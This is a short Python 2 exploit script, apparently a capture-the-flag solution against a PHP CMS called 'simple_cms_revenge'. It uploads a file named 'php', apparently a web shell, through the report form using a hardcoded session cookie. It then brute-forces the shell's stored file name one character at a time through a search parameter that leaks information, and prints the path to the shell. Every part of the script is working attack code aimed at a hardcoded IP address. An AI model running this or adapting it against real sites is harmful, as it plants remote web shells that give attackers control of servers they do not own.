import requests


#header = {'Cookie': 'PHPSESSID=erj64ibm3fah50bmr15065j0a1'} #local
header ={'Cookie': 'PHPSESSID=incfj5egnoo503jhe5p1h0jhb5'}
def find_path(condtion, path):	
	ascii_table = '0123456789abcdef_'
	for _str in ascii_table:
		if condtion == '1':
			try_str = path + _str
		else:
			try_str = _str + path
		#url = 'http://127.0.0.1/simple_cms_revenge/index.php?act=report&mid=search&col=file&type=1&search={}'.format(try_str)
		url = 'http://211.117.60.187/index.php?act=report&mid=search&col=file&type=1&search={}'.format(try_str)
		if requests.get(url, headers=header).text.find('<tr><td>Did</td><td>you</td><td>find</td><td>a bug?</td></tr>') == -1:
			return _str
	return False

		

#url = "http://127.0.0.1/simple_cms_revenge/index.php?act=report&mid=write"
url = "http://211.117.60.187/index.php?act=report&mid=write"
data  =  {
	"title": "hello",
	"content": "cottent",
}
f = {
	'image': open('php', 'rb')
}

if requests.post(url, headers=header, files=f, data=data).text.find('report!') != -1:
	print 'upload shell'

	path = '.php'
	while True:
		tmp = find_path('1', path)
		if tmp == False:
			break
		path += tmp
		print path
	while True:
		tmp = find_path('2', path)
		if tmp == False:
			break
		path = tmp + path
		print path

print 'you can get shell data/simple_cms_upload/report/{}'.format(path)
